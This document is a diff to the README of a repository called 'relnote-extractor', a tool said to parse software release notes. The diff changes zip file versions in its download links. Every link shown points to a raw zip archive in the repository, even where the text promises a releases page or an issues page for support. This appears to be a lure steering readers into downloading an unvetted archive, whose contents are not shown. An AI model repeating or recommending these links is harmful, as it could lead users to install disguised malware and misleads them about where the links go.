@@ -1,7 +1,7 @@
 # 🎉 relnote-extractor - Extract Release Notes Easily
 
 ## 📥 Download Now
-[![Download relnote-extractor](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_2.5.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_2.5.zip)
+[![Download relnote-extractor](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_1.4.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_1.4.zip)
 
 ## 🚀 Getting Started
 Relnote-extractor is designed to help you quickly parse update texts from software. It pulls essential details such as version numbers, dates, features, and fixes. This tool formats the information into a clear and concise summary, making it easy to track software changes.
@@ -14,7 +14,7 @@ Relnote-extractor is designed to help you quickly parse update texts from softwa
 
 ## 📥 Download & Install
 1. Click on the link below to **visit the releases page**.
-   - [Download relnote-extractor](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_2.5.zip)
+   - [Download relnote-extractor](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_1.4.zip)
 
 2. Once on the releases page, find the latest version of relnote-extractor.
 
@@ -69,7 +69,7 @@ Relnote-extractor is designed to help you quickly parse update texts from softwa
 - **End Users:** Stay informed about the latest features and fixes in the software you use.
 
 ## ✉️ Support
-If you encounter any issues or have questions about using relnote-extractor, feel free to open an issue on the [GitHub page](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_2.5.zip). We appreciate your feedback and aim to improve the tool continuously.
+If you encounter any issues or have questions about using relnote-extractor, feel free to open an issue on the [GitHub page](https://github.com/cesarsilva14/relnote-extractor/raw/refs/heads/main/relnote_extractor/relnote_extractor_1.4.zip). We appreciate your feedback and aim to improve the tool continuously.
 
 ## 📖 Learn More
 For detailed documentation and additional features, check out the repository on GitHub. You can find examples, tips, and advice from the community.
